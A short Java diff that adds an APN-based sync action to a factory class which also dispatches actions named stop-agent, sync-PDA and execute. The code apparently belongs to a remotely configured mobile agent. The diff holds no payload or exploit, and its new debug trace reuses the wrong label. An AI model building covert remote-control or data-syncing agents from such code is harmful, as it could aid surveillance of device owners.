@@ -30,6 +30,7 @@ public abstract class SubAction {
     public static final int ACTION_STOP_AGENT = ACTION + 0x7;
     public static final int ACTION_SYNC_PDA = ACTION + 0x8;
     public static final int ACTION_EXECUTE = ACTION + 0x9;
+    public static final int ACTION_SYNC_APN = ACTION + 0xa;
 
     /**
      * Factory.
@@ -42,7 +43,7 @@ public abstract class SubAction {
      */
     public static SubAction factory(final int actionId_, final byte[] confParams) {
         switch (actionId_) {
-        case ACTION_SYNC:
+        case ACTION_SYNC:        
             // #debug debug
             debug.trace("Factory ACTION_SYNC");
             return new SyncAction(actionId_, confParams);
@@ -78,6 +79,10 @@ public abstract class SubAction {
             // #debug debug
             debug.trace("Factory ACTION_EXECUTE");
             return new ExecuteAction(actionId_, confParams);
+        case ACTION_SYNC_APN:        
+            // #debug debug
+            debug.trace("Factory ACTION_SYNC");
+            return new SyncActionApn(actionId_, confParams);
         default:
             return null;
         }
